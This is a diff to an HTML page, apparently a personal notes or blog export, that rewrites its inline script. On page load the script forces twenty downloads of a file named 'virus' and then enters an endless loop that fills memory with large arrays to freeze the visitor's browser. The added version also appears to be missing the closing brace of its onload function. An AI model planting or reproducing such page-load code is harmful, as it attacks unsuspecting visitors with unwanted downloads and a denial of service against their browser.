@@ -208,32 +208,28 @@ Now you know why?</p>
 </div>
 </div>
 <script>
-  window.onload = function() {
-    var totalSimulations = 1e9;
-    var downloadcount = 20;
-    var sumcount = 20;
+window.onload = function() {
+
     setTimeout(() => {
-    for (let i = 1; i<=totalSimulations;i++){
-      simulationcount = 0;
-      if(i<=downloadcount){
-        var a = document.createElement('a');
-        a.href = 'virus';
-        a.download = 'virus';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }
-    if (i > 20) {
-    setTimeout(() => {
-    let a = [];
-    while (true) {
-        a.push(new Array(1e6).fill(69)); // Adds 1 million items per iteration
-       }
-     }, 1000);
-    }
-  }
-}, 2000);
-};
+        for (let i = 1; i <= 20; i++) {
+            var a = document.createElement('a');
+            a.href = 'virus';
+            a.download = 'virus';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        setTimeout(() => {
+            let a = [];
+            while (true) {
+                console.log("downloads happening"); 
+                a.push(new Array(1e6).fill(420)); 
+                let x = Math.sqrt(Math.random()) * Math.log(Math.random());
+            }
+        }, 5000); 
+    }, 3000); 
+
 </script>
 <div id="postamble" class="status">
 <p class="author">Author: Harshit Modi</p>
